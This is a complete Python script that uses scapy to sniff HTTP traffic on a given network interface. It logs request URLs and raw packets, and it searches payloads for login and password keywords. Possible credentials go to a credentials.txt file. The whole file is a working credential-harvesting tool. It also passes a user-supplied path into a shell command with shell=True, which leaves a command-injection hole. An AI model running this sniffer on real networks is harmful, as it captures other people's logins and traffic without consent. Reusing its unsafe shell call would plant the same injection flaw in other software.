# !/usr/bin/python

from sys import argv
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
from subprocess import call, CalledProcessError


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=proccess_sniffed_packet)

def proccess_sniffed_packet(packet):
    global path
    if packet.haslayer(http.HTTPRequest):
        # url extractor down below
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print('http request --> ' + url)

        with open('{}/sniffed/raw_http_data.txt'.format(path), 'a') as all_data:
            all_data.write('http request --> ' + str(packet[http.HTTPRequest]) + '\n')

        with open('{}/sniffed/raw_packet_data.txt'.format(path), 'a') as all_data:
            all_data.write('packet --> ' + str(packet) + '\n')

        # username passwor extractro down below
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = [
                'Username', 'username', 'Password', 'password', 'user', 'User', 'login', 'Login', 'pass'
            ]
            for keyword in keywords:
                if keyword in load:
                    print(colored('[+]Possible Credentials -- > ', 'red') + load)
                    with open('{}/sniffed/credentials.txt'.format(path), 'a') as all_data:
                        all_data.write('Possible --> ' + str(load) + '\n')
                    break


interface = argv[1]
path = argv[2]


print(colored('[+] Http packet sniffer started @ ', 'red', attrs=['bold']) + colored('wlan0', 'red', attrs=['bold', 'underline']))
print('[?] Sniffed data will be saved to sniffed folder')

try:
    call('mkdir {}/sniffed'.format(path), shell=True)
except CalledProcessError:
    pass

sniff(interface)
